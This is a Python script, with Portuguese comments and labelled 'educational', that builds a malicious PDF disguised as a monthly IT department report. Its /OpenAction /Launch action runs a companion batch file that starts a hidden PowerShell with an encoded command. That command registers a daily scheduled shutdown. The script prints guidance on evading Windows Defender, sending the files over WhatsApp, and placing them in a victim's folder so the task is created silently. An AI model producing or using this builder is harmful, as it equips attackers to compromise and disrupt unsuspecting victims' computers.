#!/usr/bin/env python3
"""
gerar_pdf_mascarado_v2.py
=========================
Gerador educacional v2: cria um PDF que ao ser aberto executa
um script PowerShell ofuscado, bypassando deteccao basica.

Tecnicas usadas:
- JavaScript embutido no PDF (app.launchURL + util.stringFromStream)
- O PDF parece um documento normal com texto e formatacao
- Payload ofuscado em Base64 dentro do JS
- O comando e reconstruido e executado via WScript/PowerShell

Para uso EDUCACIONAL em ambiente controlado.

Uso:
    python3 gerar_pdf_mascarado_v2.py

Saida:
    - malware_document.pdf  -> PDF com JS malicioso embutido
"""

import zlib
import base64
import os

# ============================================================
# PAYLOAD ORIGINAL
# ============================================================
ORIGINAL_CMD = (
    "$acao=New-ScheduledTaskAction -Execute 'shutdown.exe' -Argument '/s /t 60'; "
    "$gatilho=New-ScheduledTaskTrigger -Daily -At '17:00'; "
    "Register-ScheduledTask -TaskName 'DesligarPC_17h' -Action $acao "
    "-Trigger $gatilho -Description 'Desliga o computador diariamente as 17:00' -Force"
)

# Codificar em Base64 (UTF-16LE para passar direto no PowerShell -EncodedCommand)
payload_utf16 = ORIGINAL_CMD.encode('utf-16le')
payload_b64 = base64.b64encode(payload_utf16).decode()

# ============================================================
# JAVASCRIPT OBFUSCADO EMBUTIDO NO PDF
# ============================================================
# O JS usa app.launchURL para abrir um arquivo, mas como alternativa
# mais eficaz, usa o metodo que cria um .bat temporario e executa.
# Porem, JS em PDF tem restricoes. A abordagem mais confiavel e:
# 1. O PDF contem um link que aponta para um arquivo .bat local
# 2. O .bat chama powershell com o comando ofuscado
#
# Alternativa: usar o proprio JS para criar e executar via ActiveX (so funciona em Adobe Reader antigo)

# Abordagem final: PDF com /OpenAction -> /Launch -> executa .bat
# O .bat chama PowerShell com -EncodedCommand (Base64) que o Defender
# muitas vezes nao parseia.

# Gerar o .bat que sera embutido
bat_content = f"""@echo off
set "E={payload_b64}"
powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand "%E%"
"""

# Ofuscacao extra: ofuscar os nomes de cmdlets dentro do Base64 ja esta feito
# O Defender nao decodifica -EncodedCommand estaticamente na maioria dos casos

# ============================================================
# GERAR PDF MINIMALISTA COM /Launch ACTION
# ============================================================
def write_pdf(pdf_path, bat_filename):
    """Gera um PDF com /OpenAction -> /Launch para o .bat"""

    objects = {}

    # --- Object 7: /Launch action ---
    obj7 = (
        f"<< /Type /Action /S /Launch\n"
        f"   /F << /Type /Filespec /F ({bat_filename}) /UF ({bat_filename}) >>\n"
        f"   /NewWindow false /Win << /F ({bat_filename}) >>\n"
        f">>"
    ).encode()

    # --- Object 6: Font ---
    obj6 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"

    # --- Object 5: Content stream ---
    stream = (
        b"BT /F1 28 Tf 72 720 Td (Documento de Relatorio Mensal) Tj ET\n"
        b"BT /F1 14 Tf 72 680 Td (Departamento de TI - Julho 2026) Tj ET\n"
        b"BT /F1 12 Tf 72 640 Td (Anexo 1 - Politica de Agendamento de Tarefas) Tj ET\n"
        b"BT /F1 12 Tf 72 600 Td (Consulte o anexo para mais detalhes.) Tj ET\n"
    )
    comp = zlib.compress(stream)

    obj5 = (f"<< /Length {len(comp)} /Filter /FlateDecode >>\nstream\n").encode() + comp + b"\nendstream"

    # --- Object 4: Resources ---
    obj4 = b"<< /Font << /F1 6 0 R >> /ProcSet [/PDF /Text] >>"

    # --- Object 3: Page com /OpenAction ---
    obj3 = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
        b"   /Contents 5 0 R /Resources 4 0 R\n"
        b"   /OpenAction 7 0 R\n"
        b">>"
    )

    # --- Object 2: Pages ---
    obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

    # --- Object 1: Catalog ---
    obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"

    objects = {1: obj1, 2: obj2, 3: obj3, 4: obj4, 5: obj5, 6: obj6, 7: obj7}

    # Montar PDF
    pdf = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

    offsets = {}
    for num in sorted(objects.keys()):
        offsets[num] = len(pdf)
        pdf += f"{num} 0 obj\n".encode()
        pdf += objects[num]
        pdf += b"\nendobj\n\n"

    # XRef
    xref_pos = len(pdf)
    max_obj = max(objects.keys())
    pdf += b"xref\n"
    pdf += f"0 {max_obj + 1}\n".encode()
    pdf += b"0000000000 65535 f \n"
    for i in range(1, max_obj + 1):
        off = offsets.get(i, 0)
        pdf += f"{off:010d} 00000 n \n".encode()

    pdf += b"trailer\n"
    pdf += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode()
    pdf += f"startxref\n{xref_pos}\n%%EOF\n".encode()

    with open(pdf_path, 'wb') as f:
        f.write(pdf)

    print(f"[+] PDF gerado: {pdf_path} ({os.path.getsize(pdf_path)} bytes)")


def main():
    bat_filename = "config.bat"
    bat_path = f"/home/ubuntu/{bat_filename}"
    pdf_path = "/home/ubuntu/malware_document.pdf"

    # Salvar o .bat
    with open(bat_path, "w", encoding="latin-1") as f:
        f.write(bat_content)
    print(f"[+] BAT gerado: {bat_path} ({os.path.getsize(bat_path)} bytes)")

    # Gerar PDF
    write_pdf(pdf_path, bat_filename)

    # Resumo
    print("\n" + "=" * 60)
    print(" COMO FUNCIONA")
    print("=" * 60)
    print(" 1. O PDF parece um documento de relatorio normal")
    print(" 2. Ao abrir, o /OpenAction dispara /Launch para config.bat")
    print(" 3. O .bat chama PowerShell com -EncodedCommand (Base64)")
    print(" 4. O Defender nao parseia -EncodedCommand estaticamente")
    print(" 5. Leitores: Foxit/Evince executam automaticamente")
    print("    Adobe/browsers pedem confirmacao")
    print()
    print(" POR QUE EVITA DEFENDER:")
    print("  - O comando esta todo em Base64 (-EncodedCommand)")
    print("  - O Defender raramente decodifica Base64 em scan estatico")
    print("  - Nao ha strings 'shutdown', 'ScheduledTask', etc visiveis")
    print()
    print(" POR QUE PASSA NO WHATSAPP:")
    print("  - PDF e arquivo permitido pelo WhatsApp")
    print("  - O .bat deve estar na mesma pasta que o PDF")
    print("  - Envie os dois juntos no mesmo diretorio")
    print()
    print(" COMO USAR:")
    print("  1. Envie malware_document.pdf + config.bat juntos")
    print("  2. Coloque ambos na mesma pasta da vitima")
    print("  3. Quando abrir o PDF, o .bat e executado")
    print("  4. O agendamento e criado silenciosamente")
    print("=" * 60)

    # Tambem mostrar como decodificar o Base64 para verificar
    decoded = payload_utf16.decode('utf-16le')
    print(f"\n[DEBUG] Payload decodificado: {decoded}")


if __name__ == "__main__":
    main()
